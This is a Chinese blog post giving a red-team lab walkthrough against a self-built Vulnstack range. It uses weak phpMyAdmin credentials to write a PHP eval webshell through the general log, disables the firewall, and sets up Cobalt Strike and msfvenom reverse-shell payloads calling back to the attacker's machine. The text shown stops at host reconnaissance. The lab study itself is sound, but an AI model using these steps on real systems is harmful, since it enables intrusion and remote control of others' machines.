<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="白仁的博客" type="application/atom+xml" />






<meta name="description" content="红队靶场评估-1学习学习，记录记录。感谢红日安全团队：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F; 0x00 环境搭建使用VM划分不同的网段，VMnet1：192.168.52.0&#x2F;24为外网；VMnet2：192.168.72.0&#x2F;24为内网：  给跳板机windows7添加多一个网络适配器，设置为以下靶场信息： 123windows7 - 外网ip:192.168.5">
<meta property="og:type" content="article">
<meta property="og:title" content="红队靶场评估-1">
<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;12&#x2F;27&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;index.html">
<meta property="og:site_name" content="白仁的博客">
<meta property="og:description" content="红队靶场评估-1学习学习，记录记录。感谢红日安全团队：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F; 0x00 环境搭建使用VM划分不同的网段，VMnet1：192.168.52.0&#x2F;24为外网；VMnet2：192.168.72.0&#x2F;24为内网：  给跳板机windows7添加多一个网络适配器，设置为以下靶场信息： 123windows7 - 外网ip:192.168.5">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;1-vm%E7%BD%91%E7%BB%9C.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;2-%E6%89%ABweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8F%A3.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;3-%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;4-web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A2%E9%92%88.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;5.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;7.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;6.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;8.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;9.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;10.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;11.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;13.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;12.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;14.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;15.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;16.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;17.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;18.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;19.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;20.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;21.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;22.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;23.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;24.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;25.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;34.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;26.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;27.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;28.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;29.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;30.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;31.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;35.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;44.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;45.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;32.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;33.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;36.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;37.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;38.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;39.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;40.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;41.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;42.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;43.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;46.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;47.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;48.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;49.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;53.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;50.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;51.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;52.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;54.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;55.png">
<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;56.png">
<meta property="og:updated_time" content="2020-12-27T04:39:31.767Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1&#x2F;1-vm%E7%BD%91%E7%BB%9C.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://bai-ren-1.github.io/2020/12/27/红队靶场评估-1/"/>





  <title>红队靶场评估-1 | 白仁的博客</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">白仁的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="白仁">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="白仁的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">红队靶场评估-1</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-27T12:14:24+08:00">
                2020-12-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
                    <span itemprop="name">后渗透</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="红队靶场评估-1"><a href="#红队靶场评估-1" class="headerlink" title="红队靶场评估-1"></a>红队靶场评估-1</h1><p>学习学习，记录记录。感谢红日安全团队：<a href="http://vulnstack.qiyuanxuetang.net/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/</a></p>
<h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><p>使用VM划分不同的网段，VMnet1：192.168.52.0/24为外网；VMnet2：192.168.72.0/24为内网：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/1-vm%E7%BD%91%E7%BB%9C.png" alt></p>
<p>给跳板机windows7添加多一个网络适配器，设置为以下靶场信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows7 - 外网ip:192.168.52.143 + 内网ip:192.168.72.110 - Web服务器</span><br><span class="line">windows server 2003 - 内网ip:192.168.72.141 - 域成员机器</span><br><span class="line">windows server 2008 - 内网ip:192.168.72.138 - 域控</span><br></pre></td></tr></table></figure>

<p>攻击机信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali - 外网ip：192.168.52.128 - 渗透机</span><br></pre></td></tr></table></figure>



<h2 id="0x01-渗透Web服务器"><a href="#0x01-渗透Web服务器" class="headerlink" title="0x01 渗透Web服务器"></a>0x01 渗透Web服务器</h2><h3 id="00-端口扫描"><a href="#00-端口扫描" class="headerlink" title="00 端口扫描"></a>00 端口扫描</h3><p>首先使用nmap对Web服务器进行全端口扫描：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -n -T4 -p- <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">143</span></span><br></pre></td></tr></table></figure>

<p>扫描出Web服务器的开放端口有80和3306：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/2-%E6%89%ABweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8F%A3.png" alt></p>
<h3 id="01-目录扫描"><a href="#01-目录扫描" class="headerlink" title="01 目录扫描"></a>01 目录扫描</h3><p>首先从80端口Web服务进行渗透，使用dirsearch进行目录扫描：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./dirsearch.py -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">143</span> -e php</span><br></pre></td></tr></table></figure>

<p>扫描后得到几个敏感路径：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/3-%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3.png" alt></p>
<p>尝试在浏览器访问l.php，原来是探针文件。这样就得到了phpstudy的绝对路径等信息：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/4-web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A2%E9%92%88.png" alt></p>
<h3 id="02-phpmyadmin写shell"><a href="#02-phpmyadmin写shell" class="headerlink" title="02 phpmyadmin写shell"></a>02 phpmyadmin写shell</h3><p>访问phpmyadmin，弱口令root/root登入后台：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/5.png" alt></p>
<p>使用命令查询是否开启secure_file_priv：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure_file%&apos;;</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/7.png" alt></p>
<blockquote>
<p>secure_file_priv 值为 NULL，不能使用 into outfile 方式写入 shell</p>
</blockquote>
<p>转变思路，使用命令查询是否开启了日志功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%general%&apos;;</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/6.png" alt></p>
<p>没有开启日志功能，我们使用下面命令开启并且指定日志文件，配合探针获取的绝对路径写入shell：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = on;</span><br><span class="line">show variables like &apos;%general%&apos;;</span><br><span class="line">set global general_log_file = &apos;C:/phpstudy_pro/WWW/1.php&apos;; </span><br><span class="line">select &apos;&lt;?php eval($_POST[bairen]);?&gt;&apos;;</span><br></pre></td></tr></table></figure>

<p>执行成功！既查询后开启了日志功能，同时指定日志文件是C:/phpstudy_pro/WWW/1.php：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/8.png" alt></p>
<h3 id="03-连接Webshell"><a href="#03-连接Webshell" class="headerlink" title="03 连接Webshell"></a>03 连接Webshell</h3><p>使用蚁剑连接到写入的1.php一句话，连接成功：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/9.png" alt></p>
<p>我们可以看到通过日志功能写的1.php虽然有其他内容，但并不影响执行eval：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/10.png" alt></p>
<h3 id="04-shell传递"><a href="#04-shell传递" class="headerlink" title="04 shell传递"></a>04 shell传递</h3><h4 id="001-转为CS的shell"><a href="#001-转为CS的shell" class="headerlink" title="001 转为CS的shell"></a>001 转为CS的shell</h4><p>首先在kali上启动teamserver：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.52.128 123456</span><br></pre></td></tr></table></figure>

<blockquote>
<p>CS的Beacon时常会执行不了命令，或者beacon断开连接，此时需要重新开启teamserver。</p>
</blockquote>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/11.png" alt></p>
<p>因为都是在自己搭建的网络环境，这里直接使用kali作为客户端连接teamserver。然后开启一个http监听：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/13.png" alt></p>
<p>有蚁剑的shell上传很方便，所以选择生成可执行二进制文件作为我们的木马：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/12.png" alt></p>
<p>选择我们刚才的监听器，生成木马，保存为bairenmuma.exe：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/14.png" alt></p>
<p>然后我们使用蚁剑上传我们刚生成的木马。在上传之前先关闭防火墙功能，免得被Web服务器管理员所看到：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/15.png" alt></p>
<p>上传木马并执行，就能在CS中上线，即把蚁剑的shell转到了CS中：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/16.png" alt></p>
<p>其他CS上线方式可以参考：<a href="https://www.freebuf.com/articles/web/252594.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/252594.html</a></p>
<h4 id="002-转为MSF的shell"><a href="#002-转为MSF的shell" class="headerlink" title="002 转为MSF的shell"></a>002 转为MSF的shell</h4><p>直接使用msfconsole命令进行msf，然后使用msfvenom生成木马</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">128</span> lport=<span class="number">6666</span> -f exe&gt;bairenmsf.exe</span><br></pre></td></tr></table></figure>

<p>在msf中执行监听，命令如下：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">128</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">6666</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>使用蚁剑将msf的木马上传并且执行，就能在msf收到shell：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/17.png" alt></p>
<h2 id="0x02-渗透域服务器"><a href="#0x02-渗透域服务器" class="headerlink" title="0x02 渗透域服务器"></a>0x02 渗透域服务器</h2><h3 id="00-信息收集"><a href="#00-信息收集" class="headerlink" title="00 信息收集"></a>00 信息收集</h3><h4 id="001-本机信息收集"><a href="#001-本机信息收集" class="headerlink" title="001 本机信息收集"></a>001 本机信息收集</h4><p>因为不存在杀软环境所以将CS的心跳值调低为0提高效率，进入上线主机beacon执行sleep命令：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/18.png" alt></p>
<blockquote>
<p>心跳时间是指上线的服务器和cs服务器的通信时间。在cs中默认的心跳时间是60s,我们可以用sleep 命令来更改心跳时间；心跳时间很长就会响应的时间很慢，但也不能设置的很短，不让很容易会被监测到与cs通信的流量，具体多少可以根据测试环境自己来设置。上图设置后为0执行命令马上获得结果回显。</p>
</blockquote>
<p>使用CS进行本机信息收集，下面是常见的命令：</p>
